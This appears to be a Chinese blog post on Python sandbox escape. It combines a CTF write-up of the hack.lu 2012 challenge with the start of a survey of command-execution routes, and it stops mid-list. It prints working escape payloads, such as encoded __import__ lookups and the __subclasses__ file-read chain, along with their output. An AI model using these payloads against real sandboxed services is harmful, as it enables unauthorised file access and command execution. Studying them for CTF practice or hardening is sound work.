<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>python沙箱逃逸 | zhiliya</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="1背景知识 我们知道，dir可以作为我们检Python对象的第一个工具。引用docs:“Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that  object.”，就是">
<meta property="og:type" content="article">
<meta property="og:title" content="python沙箱逃逸">
<meta property="og:url" content="http://yoursite.com/2020/09/19/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="zhiliya">
<meta property="og:description" content="1背景知识 我们知道，dir可以作为我们检Python对象的第一个工具。引用docs:“Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that  object.”，就是">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdn.net/20180521133626809?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
<meta property="og:image" content="https://img-blog.csdn.net/20180521133600128?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
<meta property="og:image" content="https://img-blog.csdn.net/20180521133817108?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
<meta property="og:image" content="https://img-blog.csdn.net/20180521134446760?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
<meta property="og:image" content="https://img-blog.csdn.net/20180521140345346?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
<meta property="article:published_time" content="2020-09-19T06:36:40.000Z">
<meta property="article:modified_time" content="2020-12-30T13:19:59.379Z">
<meta property="article:author" content="zhiliya">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdn.net/20180521133626809?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
  
    <link rel="alternate" href="/atom.xml" title="zhiliya" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">zhiliya</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">欢迎访问我的博客</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-python沙箱逃逸" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/19/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" class="article-date">
  <time datetime="2020-09-19T06:36:40.000Z" itemprop="datePublished">2020-09-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      python沙箱逃逸
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p><strong>背景知识</strong></p>
<p>我们知道，dir可以作为我们检Python对象的第一个工具。引用docs:“Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that  object.”，就是说，“ 没有参数，返回当前本地作用域中的名称列表。使用参数，尝试返回该对象的有效属性的列表。“</p>
<p>它并不声称是完整的，一个类可以定义一个<strong>dir</strong>方法，但现在我们可以假设它是正确的。</p>
<p>我经常使用的第二个函数是type()，简单来说，传入一个参数，它将会返回对象的类型。一旦知道一个对象的存在，使用type()你将会更充分的理解它。再次，引用文档：“ 返回对象的类型。返回值是一个类型对象。“。</p>
<p>那么开始我们接下来的试验。</p>
<p>当执行开始时，以下对象在本地作用域中（yay dir()！）：</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir()</span><br><span class="line">[&#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__name__&#39;, &#39;__package__&#39;]</span><br></pre></td></tr></table></figure>

<p>从这些，<strong>builtins</strong>是最有趣。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(__builtins__)</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>嗯，让我们看看Python语言参考： “一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”]”</p>
<p>现在，我们可以通过运行dir(__ builtins__)来检查内置函数。这个列表有点长。条目是所有内置类型和函数。</p>
<p>所以现在让我们重温前面的沙盒测试的字符串检查方法。也许你没有能力改变整个文件的编码。您仍然可以通过访问模块的底层dict，然后使用变量访问所需的函数来对单个函数调用的名称进行编码。所以让我们import os使用内置函数稍微狡猾的方式调用import：首先获取base64版本的字符串”import”和”os”：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&#39;__import__&#39;)</span><br><span class="line">&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&#39;os&#39;)</span><br><span class="line">&#39;b3M&#x3D;&#39;</span><br></pre></td></tr></table></figure>

<p>把它放在一起：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;))</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.pyc&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>嗯，所以使用文本过滤到沙盒代码很明显。</p>
<p>也许我们可以采取另一种方法在过滤，基于使用builtins.dict。因为builtins.dict是一个代表我们的环境可用的所有内置函数的字典，如果我们修改其中一个条目，我们可以改变环境的可用内容。</p>
<p>例如，abs函数返回数字的绝对值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; abs(-1)</span><br><span class="line">1</span><br></pre></td></tr></table></figure>



<p><strong>尝试攻击</strong></p>
<p>现在，让我们做更多的操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#39;abs&#39;] &#x3D; None</span><br><span class="line">&gt;&gt;&gt; abs(-1)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: &#39;NoneType&#39; object is not callable</span><br></pre></td></tr></table></figure>

<p>该del语句删除一个对象的引用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;abs&#39;]</span><br><span class="line">&gt;&gt;&gt; abs(-1)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">NameError: name &#39;abs&#39; is not defined</span><br></pre></td></tr></table></figure>

<p>我们刚刚删除了环境调用的能力abs！所以现在我们有另一种方法来处理Python沙盒 – 删除许多“危险”内置函数。</p>
<p>让我们做一个小的危险函数列表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;__import__&#39;] # __import__ is the function called by the import statement</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;eval&#39;] # evaluating code could be dangerous</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;execfile&#39;] # likewise for executing the contents of a file</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;input&#39;] # Getting user input and evaluating it might be dangerous</span><br></pre></td></tr></table></figure>

<p>嗯，这看起来有点安全，对吧？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">ImportError: __import__ not found</span><br></pre></td></tr></table></figure>

<p>等一下！</p>
<p>reload(module) 重新加载导入的模块，并执行代码 – 所以模块被导回到我们的命名空间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; reload(__builtins__)</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; dir(os)</span><br></pre></td></tr></table></figure>

<p>我想我们必须将其添加到列表中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;reload&#39;] # they might reload __builtins__ !</span><br></pre></td></tr></table></figure>

<p>好。所以现在我们有一个安全的方法，对吧？我们阻止了沙箱中的任何人使用危险的内置命令，并且我们可以通过不允许他们对整个文件进行编码和扫描内容来阻止他们使用eval关键字。希望我们删除所有危险的内置函数。，</p>
<p>让我们重温一下<a href="http://2012.hack.lu/index.php/CaptureTheFlag" target="_blank" rel="noopener">2012.hack.lu</a>的比赛题目，在这次挑战中，你需要读取’./key’文件的内容。</p>
<p>他们首先通过删除引用来销毁打开文件的内置函数。然后它们允许您执行用户输入。看看他们的代码稍微修改的版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def make_secure():</span><br><span class="line">    UNSAFE &#x3D; [&#39;open&#39;,</span><br><span class="line">              &#39;file&#39;,</span><br><span class="line">              &#39;execfile&#39;,</span><br><span class="line">              &#39;compile&#39;,</span><br><span class="line">              &#39;reload&#39;,</span><br><span class="line">              &#39;__import__&#39;,</span><br><span class="line">              &#39;eval&#39;,</span><br><span class="line">              &#39;input&#39;]</span><br><span class="line">    for func in UNSAFE:</span><br><span class="line">        del __builtins__.__dict__[func]</span><br><span class="line">from re import findall</span><br><span class="line"># Remove dangerous builtins</span><br><span class="line">make_secure()</span><br><span class="line">print &#39;Go Ahead, Expoit me &gt;;D&#39;</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        # Read user input until the first whitespace character</span><br><span class="line">        inp &#x3D; findall(&#39;S+&#39;, raw_input())[0]</span><br><span class="line">        a &#x3D; None</span><br><span class="line">        # Set a to the result from executing the user input</span><br><span class="line">        exec &#39;a&#x3D;&#39; + inp</span><br><span class="line">        print &#39;Return Value:&#39;, a</span><br><span class="line">    except Exception, e:</span><br><span class="line">    print &#39;Exception:&#39;, e</span><br></pre></td></tr></table></figure>

<p>由于我们没有在<strong>builtins</strong>中引用file和open，所以常规的编码技巧是行不通的。但是也许我们可以在Python解释器中挖掘出另一种代替file或open引用的方法。</p>
<p><strong>让我们深入一点</strong></p>
<p>（对于这一部分，我要感谢<a href="http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html" target="_blank" rel="noopener">Ned Batchelder</a>的分享，今年夏天我读这个博客，其中有一篇文章是针对eval函数危险性的说明。并在其代码中对eval()函数滥用的危险性做了进一步的演示。）。</p>
<p>将一个对象传入type()函数将返回一个type object例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type( [1,2,3] )</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>现在，让我们开始检查一个元组的字段：</p>
<p>这些都是功能。但class有点有趣。它返回表示对象的类。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(().__class__)</span><br><span class="line">&lt;type &#39;type&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>这进入元类和元类型详细信息。更多的内容都在，<a href="http://www.python.org/dev/peps/pep-0253/" target="_blank" rel="noopener">PEP 0253</a>。让我们现在忽略，并深入一点。</p>
<p>根据文档，新式类有一些特殊的属性。具体来说，bases它包含“基类，按它们在基类列表中出现的顺序” class.subclasses()，并返回所有子类的列表。</p>
<p>让我们来看看我们的元组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &#39;object&#39;&gt;,)</span><br></pre></td></tr></table></figure>

<p>它直接从对象继承。我不知道还有什么：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()</span><br><span class="line">[&lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;,</span><br><span class="line">&lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;,</span><br><span class="line">&lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;,</span><br><span class="line">&lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;,</span><br><span class="line">&lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;,</span><br><span class="line">&lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;,</span><br><span class="line">&lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;,</span><br><span class="line">&lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;,</span><br><span class="line">&lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;,</span><br><span class="line">&lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;,</span><br><span class="line">&lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;,</span><br><span class="line">&lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;,</span><br><span class="line">&lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;,</span><br><span class="line">... and more!</span><br></pre></td></tr></table></figure>

<p>我们在这里有我们需要的一切！</p>
<p>然后我可以file用一些简单的行在列表中找到索引：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; all_classes &#x3D; []</span><br><span class="line">&gt;&gt;&gt; for entry in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">...     all_classes.append(entry.__name__)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; all_classes.index(&quot;file&quot;)</span><br><span class="line">40</span><br></pre></td></tr></table></figure>

<p>我们不能在挑战中使用这个代码（甚至重写为列表解析），因为它包括空格。但是由于file在索引40，我们可以硬编码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &#39;file&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>一旦我们引用了文件，我们所需要做的就是创建一个文件对象并读取它：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40](&quot;.&#x2F;key&quot;).read()</span><br><span class="line">&quot;This works&quot;</span><br></pre></td></tr></table></figure>

<p>所以解决题目我们需要，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045</span><br><span class="line">Go Ahead, Expoit me &gt;;D</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;.&#x2F;key&quot;).read()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;.&#x2F;key&quot;).read()</span><br><span class="line">Return Value: FvibLF0eBkCBk</span><br></pre></td></tr></table></figure>

<p>在旁注中，我们不需要在单个语句中执行 – exec在当前上下文中运行代码，因此通过将每个命令的输出存储在变量（除了a）之外，我们可以轻松地保持命令之间的状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045</span><br><span class="line">Go Ahead, Expoit me &gt;;D</span><br><span class="line">x&#x3D;23</span><br><span class="line">x&#x3D;23</span><br><span class="line">Return Value: 23</span><br><span class="line">45</span><br><span class="line">45</span><br><span class="line">Return Value: 45</span><br><span class="line">x</span><br><span class="line">x</span><br><span class="line">Return Value: 23</span><br></pre></td></tr></table></figure>



<p><strong>参考连接</strong></p>
<p>另一个魔法可能是有用的：<a href="http://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/c1v372r" target="_blank" rel="noopener">http://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/c1v372r</a> </p>
<p>Ned Batchelder的博文：<a href="http://nedbatchelder.com/blog/201206/eval" target="_blank" rel="noopener">http://nedbatchelder.com/blog/201206/eval</a> really is_dangerous.html </p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。</p>
<p>顺便安利一本书：《流畅的 Python》。这本书有很多中高阶知识点，很全面而且讲的很清楚，如果你看过，相信理解这篇文章的大多数内容都不是问题。</p>
<p>接下来的内容先讲系统命令执行，再讲文件写入、读取，并且均以 oj 为例，库大多以 <code>os</code> 为例。</p>
<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>先啰嗦一些基础知识</p>
<p>在 Python 中执行系统命令的方式有：</p>
<blockquote>
<p>os</p>
<p>commands：仅限<code>2.x</code></p>
<p>subprocess</p>
<p>timeit：<code>timeit.sys</code>、<code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)</code></p>
<p>platform：<code>platform.os</code>、<code>platform.sys</code>、<code>platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read()</code></p>
<p>pty：<code>pty.spawn(&#39;ls&#39;)</code>、<code>pty.os</code></p>
<p>bdb：<code>bdb.os</code>、<code>cgi.sys</code></p>
<p>cgi：<code>cgi.os</code>、<code>cgi.sys</code></p>
<p>…</p>
</blockquote>
<p>我写了一个脚本，测试了一下所有的导入 <code>os</code> 或者 <code>sys</code> 的库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8 -*-</span><br><span class="line"># By Macr0phag3</span><br><span class="line"># in 2019-05-07 19:46:12</span><br><span class="line"># ------------------------------------</span><br><span class="line"></span><br><span class="line"># this, antigravity 库删掉</span><br><span class="line">all_modules_2 &#x3D; [</span><br><span class="line">    &#39;BaseHTTPServer&#39;, &#39;imaplib&#39;, &#39;shelve&#39;, &#39;Bastion&#39;, &#39;anydbm&#39;, &#39;imghdr&#39;, &#39;shlex&#39;, &#39;CDROM&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;shutil&#39;, &#39;CGIHTTPServer&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;signal&#39;, &#39;Canvas&#39;, &#39;ast&#39;, &#39;imputil&#39;, &#39;site&#39;, &#39;ConfigParser&#39;, &#39;asynchat&#39;, &#39;inspect&#39;, &#39;sitecustomize&#39;, &#39;Cookie&#39;, &#39;asyncore&#39;, &#39;io&#39;, &#39;smtpd&#39;, &#39;DLFCN&#39;, &#39;atexit&#39;, &#39;itertools&#39;, &#39;smtplib&#39;, &#39;Dialog&#39;, &#39;audiodev&#39;, &#39;json&#39;, &#39;sndhdr&#39;, &#39;DocXMLRPCServer&#39;, &#39;audioop&#39;, &#39;keyword&#39;, &#39;socket&#39;, &#39;FileDialog&#39;, &#39;base64&#39;, &#39;lib2to3&#39;, &#39;spwd&#39;, &#39;FixTk&#39;, &#39;bdb&#39;, &#39;linecache&#39;, &#39;sqlite3&#39;, &#39;HTMLParser&#39;, &#39;binascii&#39;, &#39;linuxaudiodev&#39;, &#39;sre&#39;, &#39;IN&#39;, &#39;binhex&#39;, &#39;locale&#39;, &#39;sre_compile&#39;, &#39;MimeWriter&#39;, &#39;bisect&#39;, &#39;logging&#39;, &#39;sre_constants&#39;, &#39;Queue&#39;, &#39;bsddb&#39;, &#39;lsb_release&#39;, &#39;sre_parse&#39;, &#39;ScrolledText&#39;, &#39;bz2&#39;, &#39;macpath&#39;, &#39;ssl&#39;, &#39;SimpleDialog&#39;, &#39;cPickle&#39;, &#39;macurl2path&#39;, &#39;stat&#39;, &#39;SimpleHTTPServer&#39;, &#39;cProfile&#39;, &#39;mailbox&#39;, &#39;statvfs&#39;, &#39;SimpleXMLRPCServer&#39;, &#39;cStringIO&#39;, &#39;mailcap&#39;, &#39;string&#39;, &#39;SocketServer&#39;, &#39;calendar&#39;, &#39;markupbase&#39;, &#39;stringold&#39;, &#39;StringIO&#39;, &#39;cgi&#39;, &#39;marshal&#39;, &#39;stringprep&#39;, &#39;TYPES&#39;, &#39;cgitb&#39;, &#39;math&#39;, &#39;strop&#39;, &#39;Tix&#39;, &#39;chunk&#39;, &#39;md5&#39;, &#39;struct&#39;, &#39;Tkconstants&#39;, &#39;cmath&#39;, &#39;mhlib&#39;, &#39;subprocess&#39;, &#39;Tkdnd&#39;, &#39;cmd&#39;, &#39;mimetools&#39;, &#39;sunau&#39;, &#39;Tkinter&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;sunaudio&#39;, &#39;UserDict&#39;, &#39;codecs&#39;, &#39;mimify&#39;, &#39;symbol&#39;, &#39;UserList&#39;, &#39;codeop&#39;, &#39;mmap&#39;, &#39;symtable&#39;, &#39;UserString&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sys&#39;, &#39;_LWPCookieJar&#39;, &#39;colorsys&#39;, &#39;multifile&#39;, &#39;sysconfig&#39;, &#39;_MozillaCookieJar&#39;, &#39;commands&#39;, &#39;multiprocessing&#39;, &#39;syslog&#39;, &#39;__builtin__&#39;, &#39;compileall&#39;, &#39;mutex&#39;, &#39;tabnanny&#39;, &#39;__future__&#39;, &#39;compiler&#39;, &#39;netrc&#39;, &#39;talloc&#39;, &#39;_abcoll&#39;, &#39;contextlib&#39;, &#39;new&#39;, &#39;tarfile&#39;, &#39;_ast&#39;, &#39;cookielib&#39;, &#39;nis&#39;, &#39;telnetlib&#39;, &#39;_bisect&#39;, &#39;copy&#39;, &#39;nntplib&#39;, &#39;tempfile&#39;, &#39;_bsddb&#39;, &#39;copy_reg&#39;, &#39;ntpath&#39;, &#39;termios&#39;, &#39;_codecs&#39;, &#39;crypt&#39;, &#39;nturl2path&#39;, &#39;test&#39;, &#39;_codecs_cn&#39;, &#39;csv&#39;, &#39;numbers&#39;, &#39;textwrap&#39;, &#39;_codecs_hk&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;_codecs_iso2022&#39;, &#39;curses&#39;, &#39;operator&#39;, &#39;thread&#39;, &#39;_codecs_jp&#39;, &#39;datetime&#39;, &#39;optparse&#39;, &#39;threading&#39;, &#39;_codecs_kr&#39;, &#39;dbhash&#39;, &#39;os&#39;, &#39;time&#39;, &#39;_codecs_tw&#39;, &#39;dbm&#39;, &#39;os2emxpath&#39;, &#39;timeit&#39;, &#39;_collections&#39;, &#39;decimal&#39;, &#39;ossaudiodev&#39;, &#39;tkColorChooser&#39;, &#39;_csv&#39;, &#39;difflib&#39;, &#39;parser&#39;, &#39;tkCommonDialog&#39;, &#39;_ctypes&#39;, &#39;dircache&#39;, &#39;pdb&#39;, &#39;tkFileDialog&#39;, &#39;_ctypes_test&#39;, &#39;dis&#39;, &#39;pickle&#39;, &#39;tkFont&#39;, &#39;_curses&#39;, &#39;distutils&#39;, &#39;pickletools&#39;, &#39;tkMessageBox&#39;, &#39;_curses_panel&#39;, &#39;doctest&#39;, &#39;pipes&#39;, &#39;tkSimpleDialog&#39;, &#39;_elementtree&#39;, &#39;dumbdbm&#39;, &#39;pkgutil&#39;, &#39;toaiff&#39;, 